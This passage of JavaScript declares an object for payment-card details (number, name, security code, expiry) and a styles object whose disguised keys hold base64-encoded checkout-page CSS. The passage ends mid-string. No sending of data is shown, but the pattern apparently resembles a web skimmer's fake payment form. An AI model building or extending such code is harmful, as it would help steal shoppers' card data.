
let state = {
    cardType: "",
    cardNumber: "",
    nameOnCard: "",
    securityCode: "",
    expirationDate: ""
}

const STYLES = {
    action_value: "DQouXzFmcmFnZW0xOC0xcSB7DQogICAgZGlzcGxheTogYmxvY2sNCn0NCg0KLl8xZnJhZ2VtYWstMXEgew0KICAgIGNsaXA6IHJlY3QoMCwgMCwgMCwgMCk7DQogICAgYm9yZGVyLXdpZHRoOiAwOw0KICAgIGhlaWdodDogMXB4Ow0KICAgIG1hcmdpbjogLTFweDsNCiAgICBvdmVyZmxvdzogaGlkZGVuOw0KICAgIHBhZGRpbmc6IDA7DQogICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogICAgd2lkdGg6IDFweA0KfQ0KDQouXzFmcmFnZW1haS0xcSB7DQogICAgcG9zaXRpb246IHJlbGF0aXZlDQp9DQoNCi5XbzRxVy0xcSB7DQogICAgLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzOiB2YXIoLS14LW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMsIHZhcigtLXgtY29udHJvbC1ib3JkZXItcmFkaXVzLCB2YXIoLS14LWdsb2JhbC1ib3JkZXItcmFkaXVzLCB2YXIoLS14LWJvcmRlci1yYWRpdXMtYmFzZSkpKSk7DQogICAgY29sb3I6IHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0KQ0KfQ0KDQoubTVJdFAtMXEgew0KICAgIC0teC1kZWZhdWx0LWNvbG9yLWJhY2tncm91bmQ6IHZhcigtLXgtY29sb3ItY29sb3IzLWJhY2tncm91bmQpOw0KICAgIC0teC1kZWZhdWx0LWNvbG9yLWJhY2tncm91bmQtc3ViZHVlZDogdmFyKC0teC1jb2xvci1jb2xvcjMtYmFja2dyb3VuZC1zdWJkdWVkKTsNCiAgICAtLXgtZGVmYXVsdC1jb2xvci10ZXh0OiB2YXIoLS14LWNvbG9yLWNvbG9yMy10ZXh0KTsNCiAgICAtLXgtZGVmYXVsdC1jb2xvci10ZXh0LXN1YmR1ZWQ6IHZhcigtLXgtY29sb3ItY29sb3IzLXRleHQtc3ViZHVlZCk7DQogICAgLS14LWRlZmF1bHQtY29sb3ItYWNjZW50OiB2YXIoLS14LWNvbG9yLWNvbG9yMy1hY2NlbnQpOw0KICAgIC0teC1kZWZhdWx0LWNvbG9yLWJhY2tncm91bmQtZGlzYWJsZWQ6IHZhcigtLXgtY29sb3ItY29sb3IzLWJhY2tncm91bmQtZGlzYWJsZWQpOw0KICAgIC0tb3B0aW9uLWxpc3QtaW5uZXItYm9yZGVyLWNvbG9yOiB2YXIoLS14LWNvbG9yLWNvbG9yMy1ib3JkZXIpOw0KICAgIC0tb3B0aW9uLWxpc3QtYmFja2dyb3VuZC1jb2xvcjogdmFyKC0teC1jb2xvci1jb2xvcjMtYmFja2dyb3VuZCk7DQogICAgLS1vcHRpb24tbGlzdC1iYWNrZ3JvdW5kLWNvbG9yLWhvdmVyZWQ6IHZhcigtLXgtY29sb3ItY29sb3IzLWhvdmVyZWQpOw0KICAgIC0tb3B0aW9uLWxpc3QtZGV0YWlscy1iYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS14LWNvbG9yLWNvbG9yMy1iYWNrZ3JvdW5kLXN1YmR1ZWQpDQp9DQoNCi5ORE1lOS0xcS5QdVZmMC0xcSB7DQogICAgYm9yZGVyOiAxcHggdmFyKC0teC1kZWZhdWx0LWNvbG9yLWJvcmRlcikgdmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXN0eWxlKQ0KfQ0KDQouTkRNZTktMXEuUHVWZjAtMXEgLkI0ekg2LTFxOm5vdCg6Zmlyc3QtY2hpbGQpIHsNCiAgICBib3JkZXItYmxvY2stc3RhcnQ6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpOw0KICAgIGJvcmRlci10b3A6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpDQp9DQoNCi5ORE1lOS0xcSAuQjR6SDYtMXEuUHVWZjAtMXEgew0KICAgIGJvcmRlcjogMXB4IHZhcigtLXgtZGVmYXVsdC1jb2xvci1ib3JkZXIpIHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1zdHlsZSkNCn0NCg0KLk5ETWU5LTFxIC5iN1VfUC0xcSwNCi5sd1o2bC0xcSAuQjR6SDYtMXEuUHVWZjAtMXEsDQoubHdaNmwtMXEuUHVWZjAtMXEgLkI0ekg2LTFxOm5vdCg6Zmlyc3QtY2hpbGQpIHsNCiAgICBib3JkZXItYmxvY2stc3RhcnQ6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpOw0KICAgIGJvcmRlci10b3A6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpDQp9DQoNCi5OZFRKRS0xcSB7DQogICAgLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGU6IHNvbGlkDQp9DQoNCi5QdVZmMC0xcSwNCi5QdVZmMC0xcT4uaGVhZGVyLWxhYmVsLTFxIHsNCiAgICBib3JkZXItcmFkaXVzOiB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKQ0KfQ0KDQouUHVWZjAtMXE+KiB7DQogICAgLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyOiB2YXIoLS1vcHRpb24tbGlzdC1pbm5lci1ib3JkZXItY29sb3IpDQp9DQoNCi5sd1o2bC0xcSAuQjR6SDYtMXEuUHVWZjAtMXEgew0KICAgIGJvcmRlci1ibG9jay1lbmQ6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpOw0KICAgIGJvcmRlci1ib3R0b206IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpDQp9DQoNCi5sd1o2bC0xcSAuQjR6SDYtMXEuUHVWZjAtMXE6Zmlyc3QtY2hpbGQgew0KICAgIGJvcmRlci1ibG9jay1zdGFydC13aWR0aDogMDsNCiAgICBib3JkZXItdG9wLXdpZHRoOiAwDQp9DQoNCi5sd1o2bC0xcSAuQjR6SDYtMXEuUHVWZjAtMXE6bGFzdC1jaGlsZCB7DQogICAgYm9yZGVyLWJsb2NrLWVuZC13aWR0aDogMDsNCiAgICBib3JkZXItYm90dG9tLXdpZHRoOiAwDQp9DQoNCi5CNHpINi0xcSB7DQogICAgLXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS1vcHRpb24tbGlzdC1iYWNrZ3JvdW5kLWNvbG9yKTsNCiAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIHZhcigtLXgtZHVyYXRpb24tYmFzZSkgdmFyKC0teC10aW1pbmctYmFzZSkNCn0NCg0KLkI0ekg2LTFxOm5vdCg6Zmlyc3QtY2hpbGQpIHsNCiAgICBtYXJnaW4tYmxvY2stc3RhcnQ6IHZhcigtLXgtb3B0aW9uLWxpc3QtYmxvY2stc3BhY2luZyk7DQogICAgbWFyZ2luLXRvcDogdmFyKC0teC1vcHRpb24tbGlzdC1ibG9jay1zcGFjaW5nKQ0KfQ0KDQpbZGlyPWx0cl0gLkI0ekg2LTFxOmZpcnN0LWNoaWxkIHsNCiAgICBib3JkZXItdG9wLWxlZnQtcmFkaXVzOiBjYWxjKHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpIC0gMXB4KQ0KfQ0KDQpbZGlyPWx0cl0gLkI0ekg2LTFxOmZpcnN0LWNoaWxkLA0KW2Rpcj1ydGxdIC5CNHpINi0xcTpmaXJzdC1jaGlsZCB7DQogICAgYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IGNhbGModmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cykgLSAxcHgpDQp9DQoNCltkaXI9cnRsXSAuQjR6SDYtMXE6Zmlyc3QtY2hpbGQgew0KICAgIGJvcmRlci10b3AtbGVmdC1yYWRpdXM6IGNhbGModmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cykgLSAxcHgpDQp9DQoNCi5CNHpINi0xcTpmaXJzdC1jaGlsZCB7DQogICAgYm9yZGVyLXN0YXJ0LWVuZC1yYWRpdXM6IGNhbGModmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cykgLSAxcHgpOw0KICAgIGJvcmRlci1zdGFydC1zdGFydC1yYWRpdXM6IGNhbGModmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cykgLSAxcHgpDQp9DQoNCltkaXI9bHRyXSAuQjR6SDYtMXE6Zmlyc3QtY2hpbGQ+LmhlYWRlci1sYWJlbCB7DQogICAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogdmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cykNCn0NCg0KW2Rpcj1sdHJdIC5CNHpINi0xcTpmaXJzdC1jaGlsZD4uaGVhZGVyLWxhYmVsLA0KW2Rpcj1ydGxdIC5CNHpINi0xcTpmaXJzdC1jaGlsZD4uaGVhZGVyLWxhYmVsIHsNCiAgICBib3JkZXItdG9wLXJpZ2h0LXJhZGl1czogdmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cykNCn0NCg0KW2Rpcj1ydGxdIC5CNHpINi0xcTpmaXJzdC1jaGlsZD4uaGVhZGVyLWxhYmVsIHsNCiAgICBib3JkZXItdG9wLWxlZnQtcmFkaXVzOiB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKQ0KfQ0KDQouQjR6SDYtMXE6Zmlyc3QtY2hpbGQ+LmhlYWRlci1sYWJlbCB7DQogICAgYm9yZGVyLXN0YXJ0LWVuZC1yYWRpdXM6IHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpOw0KICAgIGJvcmRlci1zdGFydC1zdGFydC1yYWRpdXM6IHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpDQp9DQoNCltkaXI9bHRyXSAuQjR6SDYtMXE6bGFzdC1jaGlsZCB7DQogICAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogY2FsYyh2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKSAtIDFweCkNCn0NCg0KW2Rpcj1sdHJdIC5CNHpINi0xcTpsYXN0LWNoaWxkLA0KW2Rpcj1ydGxdIC5CNHpINi0xcTpsYXN0LWNoaWxkIHsNCiAgICBib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czogY2FsYyh2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKSAtIDFweCkNCn0=",
    category_value: "W2Rpcj1ydGxdIC5CNHpINi0xcTpsYXN0LWNoaWxkIHsNCiAgICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiBjYWxjKHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpIC0gMXB4KQ0KfQ0KDQouQjR6SDYtMXE6bGFzdC1jaGlsZCB7DQogICAgYm9yZGVyLWVuZC1lbmQtcmFkaXVzOiBjYWxjKHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpIC0gMXB4KTsNCiAgICBib3JkZXItZW5kLXN0YXJ0LXJhZGl1czogY2FsYyh2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKSAtIDFweCkNCn0NCg0KW2Rpcj1sdHJdIC5CNHpINi0xcTpsYXN0LWNoaWxkIC5iN1VfUC0xcSwNCltkaXI9bHRyXSAuQjR6SDYtMXE6bGFzdC1jaGlsZD4uaGVhZGVyLWxhYmVsIHsNCiAgICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKQ0KfQ0KDQpbZGlyPWx0cl0gLkI0ekg2LTFxOmxhc3QtY2hpbGQgLmI3VV9QLTFxLA0KW2Rpcj1sdHJdIC5CNHpINi0xcTpsYXN0LWNoaWxkPi5oZWFkZXItbGFiZWwsDQpbZGlyPXJ0bF0gLkI0ekg2LTFxOmxhc3QtY2hpbGQgLmI3VV9QLTFxLA0KW2Rpcj1ydGxdIC5CNHpINi0xcTpsYXN0LWNoaWxkPi5oZWFkZXItbGFiZWwgew0KICAgIGJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItcmFkaXVzKQ0KfQ0KDQpbZGlyPXJ0bF0gLkI0ekg2LTFxOmxhc3QtY2hpbGQgLmI3VV9QLTFxLA0KW2Rpcj1ydGxdIC5CNHpINi0xcTpsYXN0LWNoaWxkPi5oZWFkZXItbGFiZWwgew0KICAgIGJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpDQp9DQoNCi5CNHpINi0xcTpsYXN0LWNoaWxkIC5iN1VfUC0xcSwNCi5CNHpINi0xcTpsYXN0LWNoaWxkPi5oZWFkZXItbGFiZWwgew0KICAgIGJvcmRlci1lbmQtZW5kLXJhZGl1czogdmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXJhZGl1cyk7DQogICAgYm9yZGVyLWVuZC1zdGFydC1yYWRpdXM6IHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpDQp9DQoNCltkaXI9bHRyXSAuQjR6SDYtMXEuWmI4MnctMXE6bGFzdC1jaGlsZDpoYXMoLmI3VV9QLTFxKT4uaGVhZGVyLWxhYmVsIHsNCiAgICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiAwDQp9DQoNCltkaXI9bHRyXSAuQjR6SDYtMXEuWmI4MnctMXE6bGFzdC1jaGlsZDpoYXMoLmI3VV9QLTFxKT4uaGVhZGVyLWxhYmVsLA0KW2Rpcj1ydGxdIC5CNHpINi0xcS5aYjgydy0xcTpsYXN0LWNoaWxkOmhhcyguYjdVX1AtMXEpPi5oZWFkZXItbGFiZWwgew0KICAgIGJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiAwDQp9DQoNCltkaXI9cnRsXSAuQjR6SDYtMXEuWmI4MnctMXE6bGFzdC1jaGlsZDpoYXMoLmI3VV9QLTFxKT4uaGVhZGVyLWxhYmVsIHsNCiAgICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiAwDQp9DQoNCi5CNHpINi0xcS5aYjgydy0xcTpsYXN0LWNoaWxkOmhhcyguYjdVX1AtMXEpPi5oZWFkZXItbGFiZWwgew0KICAgIGJvcmRlci1lbmQtZW5kLXJhZGl1czogMDsNCiAgICBib3JkZXItZW5kLXN0YXJ0LXJhZGl1czogMA0KfQ0KDQouaGVhZGVyLWFjdGl2ZSAuaGVhZGVyLWxhYmVsIHsNCiAgICAtLXgtZGVmYXVsdC1jb2xvci10ZXh0OiB2YXIoLS14LWNvbG9yLWludGVyYWN0aXZlLXRleHQtb24tZm9yZWdyb3VuZC1hcy1zdWJkdWVkLWJhY2tncm91bmQpOw0KICAgIC0teC1kZWZhdWx0LWNvbG9yLXRleHQtc3ViZHVlZDogdmFyKC0teC1jb2xvci1pbnRlcmFjdGl2ZS10ZXh0LXN1YmR1ZWQtb24tZm9yZWdyb3VuZC1hcy1zdWJkdWVkLWJhY2tncm91bmQpOw0KICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLXgtY29sb3ItaW50ZXJhY3RpdmUtZm9yZWdyb3VuZC1hcy1zdWJkdWVkLWJhY2tncm91bmQpOw0KICAgIGNvbG9yOiB2YXIoLS14LWRlZmF1bHQtY29sb3ItdGV4dCk7DQogICAgcG9zaXRpb246IHJlbGF0aXZlDQp9DQoNCi5oZWFkZXItYWN0aXZlIC5oZWFkZXItbGFiZWwtYWN0aXZlOmJlZm9yZSB7DQogICAgYm9yZGVyOiAxcHggdmFyKC0teC1jb2xvci1pbnRlcmFjdGl2ZS10ZXh0KSBzb2xpZDsNCiAgICBib3JkZXItcmFkaXVzOiBpbmhlcml0Ow0KICAgIGJvdHRvbTogLTFweDsNCiAgICBjb250ZW50OiAiIjsNCiAgICBkaXNwbGF5OiBibG9jazsNCiAgICBsZWZ0OiAtMXB4Ow0KICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICByaWdodDogLTFweDsNCiAgICB0b3A6IC0xcHg7DQogICAgaW5zZXQ6IC0xcHg7DQogICAgcG9pbnRlci1ldmVudHM6IG5vbmU7DQogICAgei1pbmRleDogMQ0KfQ0KDQouT3BtUGQtMXEgLmhlYWRlci1sYWJlbCB7DQogICAgcG9zaXRpb246IHJlbGF0aXZlDQp9DQoNCi5oZWFkZXItbGFiZWwgew0KICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgIHBhZGRpbmc6IHZhcigtLXgtb3B0aW9uLWxpc3QtYmxvY2stcGFkZGluZykgdmFyKC0teC1vcHRpb24tbGlzdC1pbmxpbmUtcGFkZGluZyk7DQogICAgYm9yZGVyLXN0YXJ0LWVuZC1yYWRpdXM6IHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpOw0KICAgIGJvcmRlci1zdGFydC1zdGFydC1yYWRpdXM6IHZhcigtLW9wdGlvbi1saXN0LWJvcmRlci1yYWRpdXMpOw0KfQ0KDQouRDFSSnItMXEgew0KICAgIGN1cnNvcjogcG9pbnRlcg0KfQ0KDQouaEVHeXotMXEgew0KICAgIGRpc3BsYXk6IGdyaWQ7DQogICAgZ2FwOiB2YXIoLS14LXNwYWNpbmctc21hbGwtMTAwKTsNCiAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IGF1dG8gMWZyDQp9DQoNCi5fNmh6anZvNS0xcSB7DQogICAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsNCiAgICBib3JkZXItcmFkaXVzOiA1MCU7DQogICAgYm9yZGVyLXN0eWxlOiBzb2xpZDsNCiAgICBib3JkZXItd2lkdGg6IHZhcigtLXgtY29udHJvbC1ib3JkZXItd2lkdGgpDQp9DQoNCi5fNmh6anZvNS0xcTpiZWZvcmUgew0KICAgIGJvcmRlci1yYWRpdXM6IDUwJTsNCiAgICBib3gtc2hhZG93OiAwIDAgMCAwIHZhcigtLV82aHpqdm8wKTsNCiAgICBjb250ZW50OiAiIjsNCiAgICBkaXNwbGF5OiBibG9jazsNCiAgICBsZWZ0OiAwOw0KICAgIG9wYWNpdHk6IC4zOw0KICAgIHBvaW50ZXItZXZlbnRzOiBub25lOw0KICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICB0b3A6IDA7DQogICAgdHJhbnNpdGlvbjogYm94LXNoYWRvdyB2YXIoLS14LWR1cmF0aW9uLWZhc3QpIHZhcigtLXgtdGltaW5nLWVhc2Utb3V0KQ0KfQ0KDQouXzZoemp2bzUtMXE6YWN0aXZlLA0KLl82aHpqdm81LTFxOmZvY3VzIHsNCiAgICBib3JkZXItY29sb3I6IHZhcigtLV82aHpqdm8wKTsNCiAgICBvdXRsaW5lOiBub25lDQp9DQoNCi5fNmh6anZvNS0xcTphY3RpdmU6YmVmb3JlLA0KLl82aHpqdm81LTFxOmZvY3VzOmJlZm9yZSB7DQogICAgYm94LXNoYWRvdzogMCAwIDAgLjNyZW0gdmFyKC0tXzZoemp2bzApDQp9",
    create: "Ll82aHpqdm81LTFxOmFjdGl2ZTpub3QoOmZvY3VzLXZpc2libGUpOmJlZm9yZSwNCi5fNmh6anZvNS0xcTpmb2N1czpub3QoOmZvY3VzLXZpc2libGUpOmJlZm9yZSB7DQogICAgYm94LXNoYWRvdzogbm9uZQ0KfQ0KDQouXzZoemp2bzUtMXE6Zm9jdXMtdmlzaWJsZTpiZWZvcmUgew0KICAgIGJveC1zaGFkb3c6IDAgMCAwIC4zcmVtIHZhcigtLV82aHpqdm8wKQ0KfQ0KDQouXzFmcmFnZW0xNi0xcSB7DQogICAgY3Vyc29yOiBwb2ludGVyDQp9DQoNCi5fMWZyYWdlbWF4LTFxIHsNCiAgICB0cmFuc2l0aW9uLXByb3BlcnR5OiBhbGwNCn0NCg0KLl8xZnJhZ2VtYXItMXEgew0KICAgIHRyYW5zaXRpb24tZHVyYXRpb246IHZhcigtLXgtZHVyYXRpb24tZmFzdCkNCn0NCg0KQG1lZGlhIHNjcmVlbiBhbmQgKHByZWZlcnMtcmVkdWNlZC1tb3Rpb246cmVkdWNlKSB7DQogICAgLl8xZnJhZ2VtYXItMXEgew0KICAgICAgICAtLXgtZHVyYXRpb24tZmFzdDogdmFyKC0teC1kdXJhdGlvbi1yZWR1Y2VkLW1vdGlvbikNCiAgICB9DQoNCiAgICAuXzFmcmFnZW1hcy0xcSB7DQogICAgICAgIC0teC1kdXJhdGlvbi1iYXNlOiB2YXIoLS14LWR1cmF0aW9uLXJlZHVjZWQtbW90aW9uKQ0KICAgIH0NCg0KICAgIC5fMWZyYWdlbWF0LTFxIHsNCiAgICAgICAgLS14LWR1cmF0aW9uLXNsb3c6IHZhcigtLXgtZHVyYXRpb24tcmVkdWNlZC1tb3Rpb24pDQogICAgfQ0KfQ0KDQouXzFmcmFnZW1iMy0xcSB7DQogICAgdHJhbnNpdGlvbi10aW1pbmctZnVuY3Rpb246IHZhcigtLXgtdGltaW5nLWVhc2Utb3V0KQ0KfQ0KDQouXzZoemp2b2ktMXEsDQouXzZoemp2b2ktMXE6YWZ0ZXIsDQouXzZoemp2b2ktMXE6YmVmb3JlIHsNCiAgICAtLV82aHpqdm8yOiBjYWxjKCh2YXIoLS14LXR5cG9ncmFwaHktc2l6ZS1kZWZhdWx0KSoxOCkvMTQpOw0KICAgIGhlaWdodDogdmFyKC0tXzZoemp2bzIpOw0KICAgIG1hcmdpbi1ibG9jay1zdGFydDogLjE0Mjg1NzE0Mjg1NzE0Mjg1ZW07DQogICAgbWFyZ2luLXRvcDogLjE0Mjg1NzE0Mjg1NzE0Mjg1ZW07DQogICAgd2lkdGg6IHZhcigtLV82aHpqdm8yKQ0KfQ0KDQouXzZoemp2bzgtMXEgew0KICAgIC0teC1kZWZhdWx0LWNvbG9yLWFjY2VudDogdmFyKC0teC1jb2xvci1jb2xvcjMtYWNjZW50KTsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS14LWNvbG9yLWNvbG9yMy1iYWNrZ3JvdW5kKQ0KfQ0KDQouXzZoemp2bzgtMXEuXzZoemp2b2ItMXEgew0KICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLXgtY29sb3ItY29sb3IzLWJhY2tncm91bmQtZGlzYWJsZWQpDQp9DQoNCi5fNmh6anZvYy0xcSB7DQogICAgYm9yZGVyLWNvbG9yOiB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKQ0KfQ0KDQouXzZoemp2b2gtMXE6Y2hlY2tlZCB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tXzZoemp2bzEpOw0KICAgIGJvcmRlcjogLjQyODU3MTQyODU3MTQyODU1ZW0gdmFyKC0tXzZoemp2bzApIHNvbGlkDQp9DQoNCi5fNmh6anZvZS0xcSB7DQogICAgLS1fNmh6anZvMDogdmFyKC0teC1jb2xvci1pbnRlcmFjdGl2ZS10ZXh0KTsNCiAgICAtLV82aHpqdm8xOiB2YXIoLS14LWNvbG9yLWludGVyYWN0aXZlLW9uLXRleHQpDQp9DQoNCi5mNWFDZS0xcSB7DQogICAgY29sdW1uLWdhcDogdmFyKC0teC1zcGFjaW5nLXNtYWxsLTEwMCk7DQogICAgZGlzcGxheTogZ3JpZDsNCiAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IG1pbm1heChtaW4tY29udGVudCwgMWZyKSBhdXRvDQp9DQoNCi5fMTlnaTd5dGctMXEgew0KICAgIC0tdGhpcy1mb250LXNpemU6IHZhcigtLXgtdHlwb2dyYXBoeS1zaXplLWRlZmF1bHQpDQp9DQoNCi5fMWZyYWdlbTFtLTFxIHsNCiAgICBmb250LXNpemU6IHZhcigtLXgtdHlwb2dyYXBoeS1zaXplLWRlZmF1bHQpDQp9DQoNCi53QUFqaC0xcSB7DQogICAgY3Vyc29yOiBkZWZhdWx0Ow0KICAgIG1hcmdpbi1ib3R0b206IC0uMDcxNDI4NTcxNDI4NTcxNDJlbTsNCiAgICBtYXJnaW4tdG9wOiAtLjA3MTQyODU3MTQyODU3MTQyZW07DQogICAgbWFyZ2luLWJsb2NrOiAtLjA3MTQyODU3MTQyODU3MTQyZW07DQp9DQoNCi5fMWZyYWdlbTFhLTFxIHsNCiAgICBkaXNwbGF5OiBmbGV4DQp9DQoNCi5fMWZyYWdlbTNiLTFxIHsNCiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGZsZXgtc3RhcnQNCn0NCg0KLl81dXF5YncyLTFxIHsNCiAgICBmbGV4LXdyYXA6IHdyYXANCn0NCg0KLl8xZnJhZ2VtOXUtMXEgew0KICAgIG1pbi1ibG9jay1zaXplOiAxMDAlOw0KICAgIG1pbi1oZWlnaHQ6IDEwMCUNCn0NCg0KLl8xZnJhZ2VtMXQtMXEgew0KICAgIHJvdy1nYXA6IHZhcigtLXgtc3BhY2luZy1zbWFsbC00MDApDQp9DQoNCi5fMWZyYWdlbTJhLTFxIHsNCiAgICBjb2x1bW4tZ2FwOiB2YXIoLS14LXNwYWNpbmctc21hbGwtNDAwKQ0KfQ0KDQouXzFmcmFnZW0wLTFxIHsNCiAgICBhbGlnbi1jb250ZW50OiBjZW50ZXINCn0NCg0KLl8xZnJhZ2VtNC0xcSB7DQogICAgYWxpZ24taXRlbXM6IGNlbnRlcg0KfQ0KDQouXzF0Z2RxdzYxLTFxIHsNCiAgICBoZWlnaHQ6IDEuNzE0Mjg1NzE0Mjg1NzE0MmVtOw0KICAgIGJsb2NrLXNpemU6IDEuNzE0Mjg1NzE0Mjg1NzE0MmVtOw0KfQ0KDQouXzFmcmFnZW1hcy0xcSB7DQogICAgdHJhbnNpdGlvbi1kdXJhdGlvbjogdmFyKC0teC1kdXJhdGlvbi1iYXNlKQ0KfQ==",
    set: "Ll8xZnJhZ2VtYjYtMXEgew0KICAgIHRyYW5zaXRpb24tdGltaW5nLWZ1bmN0aW9uOiBlYXNlLWluLW91dA0KfQ0KDQouXzFmcmFnZW0zNi0xcSB7DQogICAgd2lkdGg6IGF1dG87DQogICAgaW5saW5lLXNpemU6IGF1dG8NCn0NCg0KLl85NHN4dGIxLTFxIHsNCiAgICB3aWxsLWNoYW5nZTogaGVpZ2h0Ow0KfQ0KDQouXzFmcmFnZW03dC0xcSB7DQogICAgb3ZlcmZsb3cteDogaGlkZGVuDQp9DQoNCi5fMWZyYWdlbTd2LTFxIHsNCiAgICBvdmVyZmxvdy15OiBoaWRkZW4NCn0NCg0KLl8xZnJhZ2VtYXotMXEgew0KICAgIHRyYW5zaXRpb24tcHJvcGVydHk6IGhlaWdodA0KfQ0KDQouXzFmcmFnZW1hdC0xcSB7DQogICAgdHJhbnNpdGlvbi1kdXJhdGlvbjogdmFyKC0teC1kdXJhdGlvbi1zbG93KQ0KfQ0KDQoubHdaNmwtMXEgLmI3VV9QLTFxIHsNCiAgICBib3JkZXItYmxvY2stc3RhcnQ6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpOw0KICAgIGJvcmRlci10b3A6IDFweCB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKSB2YXIoLS1vcHRpb24tbGlzdC1ib3JkZXItc3R5bGUpDQp9DQoNCi5iN1VfUC0xcSB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tb3B0aW9uLWxpc3QtZGV0YWlscy1iYWNrZ3JvdW5kLWNvbG9yKTsNCiAgICBwYWRkaW5nOiB2YXIoLS14LW9wdGlvbi1saXN0LWJsb2NrLXBhZGRpbmcpIHZhcigtLXgtb3B0aW9uLWxpc3QtaW5saW5lLXBhZGRpbmcpOw0KICAgIHdvcmQtYnJlYWs6IGJyZWFrLXdvcmQNCn0NCg0KLmx3WjZsLTFxIC5iN1VfUC0xcSB7DQogICAgYm9yZGVyLWJsb2NrLXN0YXJ0OiAxcHggdmFyKC0teC1kZWZhdWx0LWNvbG9yLWJvcmRlcikgdmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXN0eWxlKTsNCiAgICBib3JkZXItdG9wOiAxcHggdmFyKC0teC1kZWZhdWx0LWNvbG9yLWJvcmRlcikgdmFyKC0tb3B0aW9uLWxpc3QtYm9yZGVyLXN0eWxlKQ0KfQ0KDQouXzFpcDBnNjUxLTFxIHsNCiAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IG1pbm1heCgwLCAxZnIpDQp9DQoNCkBzdXBwb3J0cyBub3QgKGdyaWQtZ2FwOjFweCkgew0KICAgIC5fMWlwMGc2NTEtMXE6bm90KC5fMWlwMGc2NTItMXEpPiorKiB7DQogICAgICAgIG1hcmdpbi1ibG9jay1zdGFydDogdmFyKC0teC1z